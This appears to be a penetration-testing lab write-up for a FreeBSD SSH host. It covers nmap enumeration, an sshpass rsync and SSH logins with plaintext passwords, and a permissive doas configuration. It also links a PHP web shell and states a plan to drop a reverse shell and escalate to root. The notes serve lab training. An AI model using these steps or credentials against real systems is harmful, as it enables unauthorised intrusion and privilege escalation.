# .20 SSH \[BSD, Pwned]

## Enumeration

```
Nmap scan report for 172.16.162.20
Host is up (0.00012s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 33:4a:77:87:5b:88:f4:f1:f3:bb:75:7b:ec:9e:21:31 (RSA)
|   256 c8:3a:f1:c9:e1:9c:31:2d:9d:26:df:c7:c5:21:d8:e3 (ECDSA)
|_  256 f6:79:92:a4:06:56:38:e3:ca:15:91:a8:dc:94:44:2c (ED25519)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

### Files

### Ports

### Exploits

{% embed url="https://github.com/kurniawandata/xcodephpshell/blob/master/xcodephpshellforfreebsd.php" %}

### Loot

## Initial Foothold

From BACKUP .19

```
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/

$ cat .history
#+1667314084
exit
```

Doas config

{% embed url="https://pavelespinal.com/freebsd/how-to-install-php-fpm-and-apache-2-4-on-freebsd/" %}

```
$ cat doas.conf
# Sample file for doas
# Please see doas.conf manual page for information on setting
# up a doas.conf file.

# Permit members of the wheel group to perform actions as root.
permit nopass :wheel

# Permit user alice to run commands a root user.
# permit alice as root

# Permit user bob to run programs as root, maintaining
# environment variables. Useful for GUI applications.
## permit keepenv bob as root

# Permit user cindy to run only the pkg package manager as root
# to perform package updates and upgrades.
## permit cindy as root cmd pkg args update
## permit cindy as root cmd pkg args upgrade

# Allow david to run id command as root without logging it
# permit nolog david as root cmd id

permit nopass andrew as root cmd service args apache24 onestart

```

## PrivEsc

Can read proof with user 'andrew'

But we are not 'root' yet.

## Post Exploitation

This whole thing is to read history of other users, not proof

Start service webserver

`doas service apache24 onestart`

`sockstat-4l`

{% code title="Those 80 ones weren't there before" %}
```
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      2275  4  tcp4   *:80                  *:*
www      httpd      2273  4  tcp4   *:80                  *:*
www      httpd      2272  4  tcp4   *:80                  *:*
www      httpd      2271  4  tcp4   *:80                  *:*
www      httpd      2270  4  tcp4   *:80                  *:*
www      httpd      2269  4  tcp4   *:80                  *:*
root     httpd      2268  4  tcp4   *:80                  *:*
root     sendmail   1980  3  tcp4   127.0.0.1:25          *:*
www      php-fpm    1973  6  tcp4   127.0.0.1:9000        *:*
www      php-fpm    1972  6  tcp4   127.0.0.1:9000        *:*
root     php-fpm    1970  8  tcp4   127.0.0.1:9000        *:*
mysql    mysqld     1962  18 tcp46  *:33060               *:*
mysql    mysqld     1962  21 tcp4   127.0.0.1:3306        *:*
root     sshd       728   4  tcp4   *:22                  *:*
root     syslogd    626   7  udp4   *:514                 *:*
```
{% endcode %}

webroot at `/usr/local/www/apache24`&#x20;

Drop a revshell and catch it

all configs at `/usr/local/etc`

```
We get reverse shell as www-data who is part of 'wheel' group aka sudoers here

/usr/local/bin/doas -u root [command]
/usr/local/bin/doas -u root cat .history

sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21
```
